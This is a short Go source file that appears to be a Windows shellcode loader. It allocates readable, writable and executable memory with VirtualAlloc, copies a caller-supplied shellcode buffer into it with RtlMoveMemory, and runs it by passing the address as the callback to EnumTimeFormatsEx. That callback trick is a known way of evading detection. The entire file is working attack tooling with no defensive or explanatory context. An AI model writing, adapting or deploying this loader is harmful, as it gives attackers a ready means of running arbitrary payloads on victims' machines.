package TT

import (
	"syscall"
	"unsafe"
)

var (
	if1 [0]byte
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	TIME_NOSECONDS         = 0x00000002
	NULL                   = 0
)

var (
	kernel32          = syscall.MustLoadDLL("kernel32.dll")
	ntdll             = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc      = kernel32.MustFindProc("VirtualAlloc")
	EnumTimeFormatsEx = kernel32.MustFindProc("EnumTimeFormatsEx")
	RtlMoveMemory     = ntdll.MustFindProc("RtlMoveMemory")
)

func Callback(shellcode []byte) {
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	LOCALE_NAME_SYSTEM_DEFAULT, _ := syscall.UTF16PtrFromString("!x-sys-default-locale")
	EnumTimeFormatsEx.Call(addr, uintptr(unsafe.Pointer(LOCALE_NAME_SYSTEM_DEFAULT)), TIME_NOSECONDS, NULL)
}
